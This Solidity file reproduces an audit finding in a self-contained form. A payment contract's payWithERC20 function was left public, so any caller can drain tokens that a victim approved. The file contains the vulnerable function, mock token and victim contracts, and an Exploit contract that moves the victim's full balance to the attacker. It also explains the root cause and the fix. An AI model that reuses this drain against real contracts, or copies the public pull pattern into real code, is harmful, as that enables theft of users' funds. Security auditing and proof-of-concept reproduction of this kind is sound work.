// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Crestal Network finding 55092 (H-1):
// "Anyone approving BlueprintV5 to spend ERC20 can get drained via
//  Payment::payWithERC20".
//
// Real audited source (the vulnerable function is reproduced VERBATIM, the
// vulnerable line is marked @>):
//   repo   github.com/sherlock-audit/2025-03-crestal-network
//   file   crestal-omni-contracts/src/Payment.sol  (L25-L32)
//   fn     Payment.payWithERC20
//   report github.com/sherlock-audit/2025-03-crestal-network-judging/issues/260
//
// Root cause: `payWithERC20` is declared `public` (should be `internal`).
// BlueprintV5 inherits Payment; users approve the BlueprintV5 proxy so it can
// pull their payment token when creating an agent. Because the pull function is
// public and takes an arbitrary `fromAddress`/`toAddress`, ANY caller can invoke
// `payWithERC20(token, amount, victim, attacker)` and move the victim's approved
// tokens to themselves. The spender whose allowance is consumed is the contract
// itself (msg.sender of `transferFrom`), which is exactly the address the victim
// approved — so the transfer succeeds and the victim is drained.
//
// The vulnerable function is byte-for-byte the audited source. `IERC20` /
// `SafeERC20` are faithful minimal doubles (real transferFrom + return check),
// and `MockUSDC` is a faithful ERC20 with real balance/allowance accounting.
// The fix (per the report) was to make `payWithERC20` `internal`.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Faithful minimal ERC20 interface (matches the members Payment uses).
interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

/// @dev Faithful minimal SafeERC20 double: performs the real `transferFrom` and
///      validates success + optional bool return, exactly like OZ's SafeERC20.
library SafeERC20 {
    function safeTransferFrom(IERC20 token, address from, address to, uint256 value) internal {
        (bool success, bytes memory data) =
            address(token).call(abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), "SafeERC20: transferFrom failed");
    }
}

/// @dev Faithful ERC20 double for the payment token (USDC, 6 decimals). Real
///      balance and allowance accounting — the drain must emerge from the code.
contract MockUSDC {
    string public name = "USD Coin";
    string public symbol = "USDC";
    uint8 public constant decimals = 6;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        require(a >= amount, "insufficient allowance");
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — `payWithERC20` is reproduced VERBATIM from the audited
// Payment.sol (L25-L32). BlueprintV5 inherits Payment; users approve this
// contract, so the public pull function lets anyone drain them.
// ─────────────────────────────────────────────────────────────────────────────
contract Payment {
    using SafeERC20 for IERC20;

    // This is to support gasless flow: normally, the caller must always be the msg.sender
    // slither-disable-next-line arbitrary-send-erc20
    function payWithERC20(address erc20TokenAddress, uint256 amount, address fromAddress, address toAddress) public { // @> VULN: `public` (should be `internal`) — anyone can pull an approved victim's tokens to an arbitrary `toAddress`
        // check from and to address
        require(fromAddress != toAddress, "Cannot transfer to self address");
        require(toAddress != address(0), "Invalid to address");
        require(amount > 0, "Amount must be greater than 0");
        IERC20 token = IERC20(erc20TokenAddress);
        token.safeTransferFrom(fromAddress, toAddress, amount);
    }
}

/// @dev Faithful victim double: an honest user who approved the BlueprintV5
///      (Payment) contract to spend their USDC in order to create an agent.
contract Victim {
    constructor(IERC20 token, address blueprint) {
        // user approves the BlueprintV5 proxy to spend their payment token
        token.approve(blueprint, type(uint256).max);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: an unrelated attacker calls the public `payWithERC20` with the
// victim as `fromAddress` and the attacker as `toAddress`, draining every USDC
// the victim approved — without any interaction from the victim beyond approval.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    MockUSDC public usdc;
    Payment public payment;
    Victim public victim;

    uint256 public victimBefore;
    uint256 public victimAfter;
    uint256 public profit;

    uint256 internal constant VICTIM_FUNDS = 10_000e6; // 10,000 USDC the victim holds & approved

    constructor() {
        usdc = new MockUSDC(); // child nonce 1 (drained/profit token)
        payment = new Payment(); // child nonce 2 (VULN)
        victim = new Victim(IERC20(address(usdc)), address(payment)); // child nonce 3
    }

    function run() external {
        // honest user is funded and (already, in Victim's ctor) approved BlueprintV5
        usdc.mint(address(victim), VICTIM_FUNDS);
        victimBefore = usdc.balanceOf(address(victim));

        uint256 attackerBefore = usdc.balanceOf(address(this));

        // attacker (this contract) calls the PUBLIC pull function, sending the
        // victim's approved balance to itself — no victim action required.
        payment.payWithERC20(address(usdc), VICTIM_FUNDS, address(victim), address(this));

        victimAfter = usdc.balanceOf(address(victim));
        profit = usdc.balanceOf(address(this)) - attackerBefore;

        // harm: attacker drained the victim's full approved balance to itself
        require(profit == VICTIM_FUNDS, "attacker did not receive the drained funds");
        require(victimAfter == 0, "victim was not fully drained");
    }
}
